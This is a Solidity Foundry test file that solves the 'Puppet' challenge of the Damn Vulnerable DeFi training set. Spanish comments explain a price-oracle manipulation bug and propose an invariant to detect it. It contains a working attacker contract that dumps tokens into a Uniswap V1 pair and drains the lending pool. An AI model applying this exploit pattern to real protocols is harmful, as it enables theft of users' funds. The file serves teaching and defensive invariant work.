// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetPool} from "../../src/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IUniswapV1Factory} from "../../src/puppet/IUniswapV1Factory.sol";

/*
 * NEXUS Offensive · training/dvd · reto "puppet"
 *
 * CLASE DE BUG: manipulación de oráculo de precio (spot de un AMM).
 *   El pool valúa el colateral con el precio SPOT de un par Uniswap V1
 *   (`uniswapPair.balance * 1e18 / token.balanceOf(uniswapPair)`). El atacante
 *   vuelca sus tokens en el par, hunde el precio del token en ETH, y así el
 *   colateral requerido para pedir prestado se vuelve ridículo → saca todos los
 *   tokens del pool por casi nada.
 *
 * FAMILIA: Oráculo / Lending con precio manipulable.
 *
 * INVARIANTE QUE LO ATRAPA (NUEVA — hueco del catálogo Capa 2):
 *   El colateral exigido debe medirse con un precio RESISTENTE a manipulación:
 *   `calculateDepositRequired(x) >= x * precioJusto * 2 / 1e18`.
 *   Capa 2 (Lending L2) asumía un precio fijo/honesto; no modelaba oráculos
 *   manipulables. => HUECO.
 */
contract PuppetChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPrivateKey;

    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
    uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;

    // Precio JUSTO de referencia: 1 token = 1 ETH (reservas iniciales 10:10).
    uint256 constant FAIR_PRICE_WEI = 1e18;

    DamnValuableToken token;
    PuppetPool lendingPool;
    IUniswapV1Exchange uniswapV1Exchange;
    IUniswapV1Factory uniswapV1Factory;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    // SETS UP CHALLENGE - DO NOT TOUCH
    function setUp() public {
        (player, playerPrivateKey) = makeAddrAndKey("player");
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        IUniswapV1Exchange uniswapV1ExchangeTemplate =
            IUniswapV1Exchange(deployCode(string.concat(vm.projectRoot(), "/builds/uniswap/UniswapV1Exchange.json")));
        uniswapV1Factory = IUniswapV1Factory(deployCode("builds/uniswap/UniswapV1Factory.json"));
        uniswapV1Factory.initializeFactory(address(uniswapV1ExchangeTemplate));

        token = new DamnValuableToken();
        uniswapV1Exchange = IUniswapV1Exchange(uniswapV1Factory.createExchange(address(token)));
        lendingPool = new PuppetPool(address(token), address(uniswapV1Exchange));

        token.approve(address(uniswapV1Exchange), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV1Exchange.addLiquidity{value: UNISWAP_INITIAL_ETH_RESERVE}(0, UNISWAP_INITIAL_TOKEN_RESERVE, block.timestamp * 2);

        token.transfer(player, PLAYER_INITIAL_TOKEN_BALANCE);
        token.transfer(address(lendingPool), POOL_INITIAL_TOKEN_BALANCE);
        vm.stopPrank();
    }

    /// @notice INVARIANTE: el colateral exigido usa un precio resistente a manipulación.
    function _invariant_fairCollateral() internal view returns (bool) {
        uint256 required = lendingPool.calculateDepositRequired(1e18);
        uint256 fair = (1e18 * FAIR_PRICE_WEI * 2) / 1e18; // factor 2x
        return required >= fair;
    }

    function _signPermit(address spender, uint256 value, uint256 deadline)
        internal
        view
        returns (uint8 v, bytes32 r, bytes32 s)
    {
        bytes32 structHash = keccak256(
            abi.encode(
                keccak256("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"),
                player,
                spender,
                value,
                token.nonces(player),
                deadline
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", token.DOMAIN_SEPARATOR(), structHash));
        (v, r, s) = vm.sign(playerPrivateKey, digest);
    }

    function test_puppet() public checkSolvedByPlayer {
        // La invariante se sostiene al inicio (colateral = 2x el valor justo).
        assertTrue(_invariant_fairCollateral(), "INV debe sostenerse al inicio");
        console.log("colateral exigido por 1 token (inicial):", lendingPool.calculateDepositRequired(1e18));

        uint256 deadline = block.timestamp + 1 days;
        // El player firma un permit OFFLINE (no cuenta como tx) para el atacante.
        address attackerAddr = vm.computeCreateAddress(player, vm.getNonce(player));
        (uint8 v, bytes32 r, bytes32 s) = _signPermit(attackerAddr, PLAYER_INITIAL_TOKEN_BALANCE, deadline);

        // UNA sola tx del player: desplegar el atacante (hace todo en el constructor).
        new PuppetAttacker{value: PLAYER_INITIAL_ETH_BALANCE}(
            token, lendingPool, uniswapV1Exchange, recovery, PLAYER_INITIAL_TOKEN_BALANCE, player, v, r, s, deadline
        );

        // Tras manipular el oráculo, el colateral exigido es ridículo → invariante rota.
        console.log("colateral exigido por 1 token (tras manip):", lendingPool.calculateDepositRequired(1e18));
        assertFalse(_invariant_fairCollateral(), "INV rota: colateral << valor justo");
    }

    // CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
    function _isSolved() private view {
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");
        assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
        assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}

/// @notice Atacante de puppet: todo en el constructor = una sola tx (CREATE).
contract PuppetAttacker {
    constructor(
        DamnValuableToken token,
        PuppetPool pool,
        IUniswapV1Exchange exchange,
        address recovery,
        uint256 playerTokens,
        address player,
        uint8 v,
        bytes32 r,
        bytes32 s,
        uint256 deadline
    ) payable {
        // 1) Tomar los tokens del player vía permit firmado offline.
        token.permit(player, address(this), playerTokens, deadline, v, r, s);
        token.transferFrom(player, address(this), playerTokens);

        // 2) Hundir el precio: vender todos los tokens al par Uniswap V1.
        token.approve(address(exchange), playerTokens);
        exchange.tokenToEthSwapInput(playerTokens, 1, deadline);

        // 3) Pedir prestado TODO el pool con colateral ahora ridículo.
        uint256 poolTokens = token.balanceOf(address(pool));
        uint256 required = pool.calculateDepositRequired(poolTokens);
        pool.borrow{value: required}(poolTokens, recovery);
    }

    receive() external payable {}
}
